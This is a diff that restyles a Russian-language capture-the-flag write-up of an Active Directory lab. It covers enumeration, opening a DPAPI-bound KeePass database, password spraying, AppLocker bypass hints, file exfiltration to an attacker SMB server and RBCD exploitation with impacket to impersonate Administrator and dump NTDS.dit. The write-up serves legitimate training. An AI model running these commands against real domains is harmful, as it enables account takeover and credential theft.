@@ -1,12 +1,20 @@
-### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО:
-- навыки работы с АД, bloodhound
-- умение эксплуатировать Resource-Based Constrained Delegation (RBCD) (привилегия AddAllowedToAct)
-- понимание DPAPI
-### Решение
-начинаем с того, что у нас уже есть права пользователя j.smith. для начала просто осмотримся - просканим порты, при возможности посмотрим шары и сдампим систему в bloodhound
+# Forward
+
+### Необходимые навыки
+
+- Перечисление Active Directory: BloodHound, enum4linux-ng, nxc, smbmap
+- Понимание DPAPI и работа с KeePass-хранилищами
+- Эксплуатация Resource-Based Constrained Delegation (RBCD) через привилегию AddAllowedToAct
+- Работа с impacket: addcomputer, rbcd, getST, psexec
+
+---
+
+### Перечисление
+
+Начальная точка — учётная запись `j.smith` с известным паролем. Начинаем с разведки: сканируем порты и сразу же запускаем полное перечисление домена.
+
 ```
-└─$ rustscan --ulimit 5000 --range 0-65535 -a ip -- -O -sC -sV -oX results.xml
-...
+rustscan --ulimit 5000 --range 0-65535 -a ip -- -O -sC -sV -oX results.xml
 PORT      STATE SERVICE       REASON          VERSION
 53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
 88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-07-09 19:35:03Z)
@@ -25,9 +33,16 @@ PORT      STATE SERVICE       REASON          VERSION
 |   DNS_Domain_Name: ctf.local
 |   DNS_Computer_Name: DC01.ctf.local
 |   DNS_Tree_Name: ctf.local
-и еще динамические порты пол rdp
++ динамические порты под RDP
 ```
-отсюда сразу узнаем, что мы находимся на контроллере домена. порты открыты стандартные, попробуем сразу энумеровать систему. через ```enum4linux-ng -A ip -u 'j.smith@ctf.local' -p 'JSmith@IT2024'``` сразу узнаем версию ос, имена пользователей, все группы и доступные шары. посмотрим, что там
+
+По имени компьютера и набору портов сразу видно: перед нами контроллер домена `DC01` в домене `ctf.local`.
+
+Запускаем полное перечисление с учётными данными j.smith:
+
+`enum4linux-ng -A ip -u 'j.smith@ctf.local' -p 'JSmith@IT2024'`
+
+Получаем версию ОС, список пользователей, все группы и доступные шары. Смотрим шары:
 
 ```
 smbmap -H ip -u 'j.smith' -p 'JSmith@IT2024'
@@ -40,10 +55,14 @@ smbmap -H ip -u 'j.smith' -p 'JSmith@IT2024'
         NETLOGON                                                READ ONLY       Logon server share 
         SYSVOL                                                  READ ONLY       Logon server share 
 ```
-в шарах что-то полезное оказалось только в sysvol (```smbclient //ip/SYSVOL -U "ctf.local\j.smith%JSmith@IT2024"```) - туда загружена политика паролей и, что самое главное, настройки реестра и привилегии
+
+Из всего перечисленного полезное нашлось только в SYSVOL:
+
+`smbclient //ip/SYSVOL -U "ctf.local\j.smith%JSmith@IT2024"`
+
+В политике безопасности (`GptTmpl.inf`) содержатся настройки реестра и привилегии:
 
 ```
-
 smb: \ctf.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\> get GptTmpl.inf -
 Unicode=yes
 [Registry Values]
@@ -80,132 +99,181 @@ SeTakeOwnershipPrivilege = *S-1-5-32-544
 SeUndockPrivilege = *S-1-5-32-544
 SeEnableDelegationPrivilege = *S-1-5-32-544
 ```
-1. Настройка реестра (SMB Signing)
-MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
-(путь в реестре: HKLM\System\CurrentControlSet\Services\LanManServer\Parameters)
-параметр: EnableSecuritySignature
-тип и значение: 4,1 означает тип REG_DWORD (код 4) и значение 1 (Включено).
-эта настройка включает подписывание SMB-пакетов на стороне сервера. предотвращает SMB Relay
-2. Версия шаблона
-signature="$CHICAGO$"
-Revision=1
-$CHICAGO$ — стандартная сигнатура, тянущаяся из времен Windows 95/NT, которую движок безопасности Windows до сих пор использует для идентификации файлов конфигурации безопасности (SecEdit)
-3. Разрешения и привилегии  (самое важное!)
-здесь права и привилегии операционной системы сопоставляются с sid'щм.
-А. Кто может входить на компьютер?
-      SeInteractiveLogonRight = *S-1-5-21-1966530601-3185510712-10604624-1611,*S-1-5-21-1966530601-3185510712-10604624-1609,*S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-548,*S-1-5-32-549,*S-1-5-32-550,*S-1-5-9,*S-1-5-21-1966530601-3185510712-10604624-1610
-SeInteractiveLogonRight — это право на локальный интерактивный вход в систему (включая RDP).
-если сопоставить SID'ы из этого списка с результатами предыдущего сканирования enum4linux, мы увидим:
-*S-1-5-21-...-1609 → пользователь j.smith
-*S-1-5-21-...-1610 → пользователь t.jones
-*S-1-5-21-...-1611 → пользователь r.williams
-*S-1-5-32-544 → встроенная группа Администраторы (Administrators)
-*S-1-5-32-548 → Операторы учетных записей (Account Operators)
-*S-1-5-32-549 → Операторы серверов (Server Operators)
 
-Б. кто может добавлять компьютеры в домен?
-      SeMachineAccountPrivilege = *S-1-5-11
-Код *S-1-5-11 — SID группы аутентифицированных юзеров.
-В. другие стандартные привилегии
-      SeDebugPrivilege = *S-1-5-32-544
-право на отладку программ (применяется для дампа памяти LSASS). назначено только группе администраторы (*S-1-5-32-544), что является безопасным стандартом.
-      SeBackupPrivilege и SeRestorePrivilege
-права на архивацию и восстановление файлов (позволяют читать/писать любые файлы в обход стандартных NTFS-прав). газначены Администраторам (*S-1-5-32-544), операторам архивации (*S-1-5-32-551) и операторам серверов (*S-1-5-32-549).
-      SeEnableDelegationPrivilege = *S-1-5-32-544
-право включать доверие для делегирования у учетных записей компьютеров и пользователей. назначено только Администраторам (*S-1-5-32-544).
-      SeNetworkLogonRight = *S-1-1-0,*S-1-5-32-544,*S-1-5-11,*S-1-5-9,*S-1-5-32-554
-доступ к компьютеру из сети (например, по SMB/WinRM). разрешен группе «Все» (*S-1-1-0), «прошедшие проверку» (*S-1-5-11) и администраторам.
+Разберём ключевые моменты из этого файла:
 
-теперь понимаем, что у нас есть как минимум право на вход на контроллер, и примерно представляяем как распределены привилегии. это немного обрисовывает общую картину, если скан с bloodhound не удастся. теперь переходим, собственно, к нему
+**1. Подписывание SMB (Registry Values)**
+
+`EnableSecuritySignature=4,1` означает, что на сервере включено SMB-подписывание (`REG_DWORD = 1`). Это блокирует SMB Relay атаки — полезно знать на будущее.
+
+**2. Сигнатура файла**
+
+`signature="$CHICAGO$"` — стандартная метка, тянущаяся ещё из Windows 95/NT. Движок безопасности Windows до сих пор использует её для идентификации файлов конфигурации SecEdit.
+
+**3. Привилегии (самое важное)**
+
+Здесь права ОС сопоставляются с SID-ами. Разберём ключевые:
+
+| Привилегия | Кому назначена | Что это значит |
+|---|---|---|
+| `SeInteractiveLogonRight` | j.smith (1609), t.jones (1610), r.williams (1611), Administrators, Account Operators, Server Operators | Право интерактивного входа и RDP |
+| `SeMachineAccountPrivilege` | `*S-1-5-11` (все аутентифицированные) | Любой пользователь может добавлять компьютеры в домен |
+| `SeDebugPrivilege` | Только Administrators | Дамп LSASS — стандартная безопасная конфигурация |
+| `SeBackupPrivilege` / `SeRestorePrivilege` | Administrators, Backup Operators, Server Operators | Чтение/запись любых файлов в обход NTFS-прав |
+| `SeEnableDelegationPrivilege` | Только Administrators | Право настраивать делегирование — у нас его нет |
+
+Из таблицы видно: у j.smith, t.jones и r.williams есть право интерактивного входа, а право добавлять компьютеры в домен есть у всех аутентифицированных пользователей (`SeMachineAccountPrivilege`). Это пригодится позже.
+
+---
+
+### BloodHound и вход через RDP
 
 ```
 bloodhound-python -u j.smith -p 'JSmith@IT2024' -d ctf.local -ns ip -c All --zip
 ./bloodhound-cli containers start
 ```
 
-сбор прошел успешно. подгружаем в графический интерфейс бладхаунда зип-архив и теперь, наконец, можем проанализировать домен. смит состоит в группе remote desktop users(значит, возможно подключение через xfreerdp). больше никаких интересных групп нет, путь к администратору домена выстроить не удалось. единственное, чьл напрягает - группа applocker, что значит, мы можем быть жестко ограничены (запрет на запуск исполняемых файлов/запуск PowerShell в режим Constrained Language Mode (ограниченный режим языка), в котором заблокирован запуск большинства функций .NET и сторонних скриптов.
-Как это обходить (AppLocker Bypass):
-Поиск папок-исключений: Администраторы часто забывают закрыть запись в определенные системные папки (например, C:\Windows\Tasks, C:\Windows\Temp или папки драйверов печати). Если в политиках AppLocker разрешен запуск всего, что находится внутри C:\Windows, вы можете перенести свой файл в C:\Windows\Tasks и запустить его оттуда.
-Использование LOLBAS: Запуск программ с помощью доверенных и подписанных самой Microsoft системных утилит (таких как mshta.exe, rundll32.exe, regsvr32.exe), которые обходят правила AppLocker, потому что находятся в белом списке системы). но это в случае жестких ограничений - сначала нужно проверить
+Загружаем архив в интерфейс BloodHound. j.smith состоит в группе `Remote Desktop Users` — можно подключаться через RDP. Прямого пути до Administrator'а у j.smith нет.
 
-<img width="1123" height="457" alt="image" src="https://github.com/user-attachments/assets/b32b5444-936b-4115-b06a-0999110dd635" />
+Одно настораживает: в домене настроен AppLocker.
 
-наконец заходим в учетную запись
+> **Об AppLocker и методах обхода**
+>
+> AppLocker может создать следующие ограничения:
+> - Запрет на запуск произвольных исполняемых файлов
+> - PowerShell переводится в режим Constrained Language Mode (CLM), в котором заблокирован запуск большинства функций .NET и сторонних скриптов
+>
+> Основные методы обхода:
+> - **Папки-исключения**: администраторы часто забывают закрыть запись в системные директории (`C:\Windows\Tasks`, `C:\Windows\Temp`, папки драйверов печати). Если политика разрешает запуск всего внутри `C:\Windows`, достаточно переместить файл туда.
+> - **LOLBAS**: использование подписанных Microsoft системных утилит (`mshta.exe`, `rundll32.exe`, `regsvr32.exe`), которые находятся в белом списке.
+>
+> Но это актуально только при жёстких ограничениях — сначала нужно проверить фактическую конфигурацию.
 
-```
-xfreerdp /v:ip /u:j.smith /p:'JSmith@IT2024' /d:ctf.local +clipboard /dynamic-resolution
-```
+Входим по RDP:
 
-сразу проверила ограничения clm через команду ```$ExecutionContext.SessionState.LanguageMode```. оказалось FullLanguage - хоть в этом моменте можно выдыхать спокойно. проверила пользователей через ```Get-ADUser -Filter * | Select-Object SamAccountName```
+`xfreerdp /v:ip /u:j.smith /p:'JSmith@IT2024' /d:ctf.local +clipboard /dynamic-resolution`
 
-перед подгрузкой тяжелых скриптов осмотрелась - удостоверилась в отсутствии интересных групп и привилегий через ```whoami /all```, после проверила рабочий стол
-
-```PS C:\Users\j.smith> Get-ChildItem -Path C:\Users\j.smith\Documents -Force```
-
-там оказался файл Database.kdbx. сначала решила перекинуть его к себе
-
-способы:
-1. передача через Base64
-Шаг 1. в консоли PowerShell конвертируем файл в Base64-строку и копируем ее:
-```[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\j.smith\Documents\Database.kdbx"))```
-Шаг 2. у себя декодируем
-```echo 'СКОПИРОВАННЫЙ_ТЕКСТ' | base64 -d > Database.kdbx```
-Решение 2. SMB-сервер (с авторизацией, тк без нее соединение блокается)
-Шаг 1. запускаем SMB-сервер с учетными данными:
-```impacket-smbserver share /tmp -smb2support -user test -password test```
-Шаг 2. на Windows-машине монтируем папку с этими учетными данными:
-```net use \\192.168.156.81\share /user:test test```
-Шаг 3. копируем файл в павершелле:
-```copy C:\Users\j.smith\Documents\Database.kdbx \\192.168.156.81\share\```
-Решение 3. RDP со сквозным диском
-```xfreerdp /v:ip /u:j.smith /p:'JSmith@IT2024' /d:ctf.local /drive:kali,/tmp +clipboard /dynamic-resolution```
-Решение 4. SCP
-Шаг 1. запускаем у себя ssh
-```sudo systemctl start ssh```
-передаем файл
-```scp C:\Users\j.smith\Documents\Database.kdbx kali@ip:/tmp/```
-
-попробовала забрутфорсить пароль через джона и хэшкат (```/snap/bin/john-the-ripper.keepass2john ~/Database.kdbx > ~/hash.txt```). ничего дельного не вышло, поэтому попробовала открыть файл на машине, тк там могло быть включено шифрование через ключ DPAPI. пробуем открыть файл на машине виндоус и бинго! сработало. там мы находим пароли от нескольких записей, хотя действительна только одна - t.jones. проверила через bloodhound - никаких интересных привилегий и путей до админа у него не показано, поэтому пока решила попробовать распылить пароли, чтобы зря не тратить время на пока кажущимся неперспективном аккаунте.
+Первым делом проверяем режим PowerShell: `$ExecutionContext.SessionState.LanguageMode` — `FullLanguage`, ограничений нет. Смотрим пользователей и собственные привилегии:
 
 ```
-┌──(olya㉿olya)-[/tmp]
-└─$ nxc smb ip -u users.txt -p pass.txt --continue-on-success
-...
-SMB         ip    445    DC01             [+] ctf.local\t.jones:***
-SMB         ip    445    DC01             [+] ctf.local\r.williams:***
+Get-ADUser -Filter * | Select-Object SamAccountName
+whoami /all
 ```
 
-супер! пароль подошел к одному из доменных пользователей. проверим его через bloodhound
+Ничего особенного. Проверяем документы пользователя:
+
+`Get-ChildItem -Path C:\Users\j.smith\Documents -Force`
+
+Находим файл `Database.kdbx` — база паролей KeePass.
+
+---
+
+### Database.kdbx: извлечение учётных данных
+
+Пробуем взломать пароль к базе через John и Hashcat:
+
+`/snap/bin/john-the-ripper.keepass2john ~/Database.kdbx > ~/hash.txt`
+
+Пароль не подбирается. Пробуем открыть базу прямо на Windows-машине — и это срабатывает: файл зашифрован с привязкой к учётной записи через DPAPI, и внутри сессии j.smith он открывается без пароля.
+
+В базе несколько записей, но действительны только пароли для `t.jones` и `r.williams`.
+
+> **Способы передачи файла с Windows на Kali** (на случай, если бы DPAPI не сработал и нужно было брутфорсить оффлайн)
+>
+> **Вариант 1 — через Base64**
+> ```powershell
+> # На Windows:
+> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\j.smith\Documents\Database.kdbx"))
+> ```
+> ```bash
+> # На Kali: вставить скопированную строку и декодировать
+> echo 'СТРОКА' | base64 -d > Database.kdbx
+> ```
+>
+> **Вариант 2 — SMB-сервер с авторизацией** (без неё соединение блокируется)
+> ```bash
+> # На Kali:
+> impacket-smbserver share /tmp -smb2support -user test -password test
+> ```
+> ```powershell
+> # На Windows:
+> net use \\192.168.156.81\share /user:test test
+> copy C:\Users\j.smith\Documents\Database.kdbx \\192.168.156.81\share\
+> ```
+>
+> **Вариант 3 — RDP со сквозным диском**
+> ```bash
+> xfreerdp /v:ip /u:j.smith /p:'JSmith@IT2024' /d:ctf.local /drive:kali,/tmp +clipboard /dynamic-resolution
+> ```
+>
+> **Вариант 4 — SCP**
+> ```bash
+> # Запустить SSH на Kali, затем с Windows:
+> scp C:\Users\j.smith\Documents\Database.kdbx kali@ip:/tmp/
+> ```
+
+---
+
+### Горизонтальное перемещение
+
+Распыляем все найденные пароли по всем известным пользователям:
+
+```
+nxc smb ip -u users.txt -p pass.txt --continue-on-success
+
+SMB    ip    445    DC01    [+] ctf.local\t.jones:***
+SMB    ip    445    DC01    [+] ctf.local\r.williams:***
+```
+
+Оба пароля рабочие. Проверяем r.williams через BloodHound — он состоит в группе сисадминов:
 
 <img width="1054" height="418" alt="image" src="https://github.com/user-attachments/assets/0ed271c7-3d77-48cc-8825-379d9a3ce0bf" />
 
-он состоит в сисадминах - уже хороший знак. также здесь уже появляется прямой путь до админа домена - через привилегию
+И, что важнее, у него появляется прямой путь до Administrator:
 
 <img width="1483" height="454" alt="image" src="https://github.com/user-attachments/assets/e347cfef-0469-449e-bd8c-5f0f46da2736" />
 
-это уязвимость Resource-Based Constrained Delegation (RBCD) (ограниченное делегирование на основе ресурсов). мы можем изменить атрибут msDS-AllowedToActOnBehalfOfOtherIdentity на контроллере домена DC01. это позволит учетной записи компьютера, которую мы сами создадим, выдавать себя за любого пользователя домена (включая Администратора) при обращении к DC01.
+---
 
-Шаг 1: создаем новую учетную запись компьютера. ранее мы уже видели в настройках безопасности, что такое право у нас есть (по правилам безопасности Windows, обычные учетные записи пользователей не умеют выполнять имперсонализацию. в этот список можно вписывать только учетные записи компьютеров(тк службу у нас создать не получится))
+### Эксплуатация RBCD
 
-```impacket-addcomputer -dc-ip <IP_DC> -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' 'ctf.local/r.williams:***'```
+Граф показывает привилегию `AddAllowedToAct` от r.williams на `DC01$`. Это уязвимость **Resource-Based Constrained Delegation (RBCD)**: мы можем изменить атрибут `msDS-AllowedToActOnBehalfOfOtherIdentity` на контроллере домена, что позволит подконтрольной нам учётной записи компьютера выдавать себя за любого пользователя домена — в том числе Administrator — при обращении к DC01.
 
-Шаг 2: настраиваем делегирование
-укажем контроллеру домена DC01$, что наш созданный компьютер ATTACKERSYSTEM$ имеет право делегирования:
+Обычные учётные записи пользователей не могут выполнять имперсонацию в Kerberos; для этого нужна учётная запись компьютера. Ранее мы видели в `GptTmpl.inf`, что `SeMachineAccountPrivilege` назначена всем аутентифицированным пользователям — значит, r.williams может создать компьютер в домене.
 
-```impacket-rbcd -dc-ip <IP_DC> -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC01$' -action 'write' 'ctf.local/r.williams:***'```
+**Шаг 1. Создаём учётную запись компьютера**
 
-Шаг 3: запрашиваем билет (Service Ticket) от имени администратора
-заставим службу Kerberos выдать нам билет для службы cifs на DC01, выдав себя за встроенного администратора:
+```
+impacket-addcomputer -dc-ip <IP_DC> -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' 'ctf.local/r.williams:***'
+```
 
-```impacket-getST -dc-ip <IP_DC> -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/ATTACKERSYSTEM$:Summer2018!'```
+**Шаг 2. Настраиваем делегирование**
 
-Шаг 4: Импортируем полученный билет и заходим на контроллер домена
+Указываем DC01, что `ATTACKERSYSTEM$` имеет право делегирования от его имени:
+
+```
+impacket-rbcd -dc-ip <IP_DC> -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC01$' -action 'write' 'ctf.local/r.williams:***'
+```
+
+**Шаг 3. Запрашиваем билет Kerberos от имени Administrator**
+
+Через механизм S4U2Proxy запрашиваем Service Ticket для службы `cifs` на DC01, выдавая себя за Administrator:
+
+```
+impacket-getST -dc-ip <IP_DC> -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/ATTACKERSYSTEM$:Summer2018!'
+```
+
+**Шаг 4. Входим на контроллер домена**
 
 ```
 export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'
 ```
 
-(либо можно сдампить все пароли и хэши из базы данных домена NTDS.dit: ```impacket-secretsdump -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'```)
+Альтернативно — можно сдампить все хэши из NTDS.dit:
 
-подключаемся за админа и забираем флаг!🥳
+```
+impacket-secretsdump -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'
+```
+
+Входим как Administrator и забираем флаг.
